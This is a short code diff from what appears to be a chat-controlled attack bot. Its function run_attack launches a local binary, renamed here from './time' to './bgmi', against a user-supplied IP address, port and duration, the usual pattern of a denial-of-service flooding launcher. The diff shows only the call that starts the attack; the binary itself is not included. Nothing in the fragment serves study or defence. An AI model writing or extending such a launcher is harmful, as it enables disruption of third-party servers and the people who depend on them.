@@ -153,7 +153,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     """Execute the actual attack"""
     try:
         process = await asyncio.create_subprocess_exec(
-            "./time", ip, port, str(duration),
+            "./bgmi", ip, port, str(duration),
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
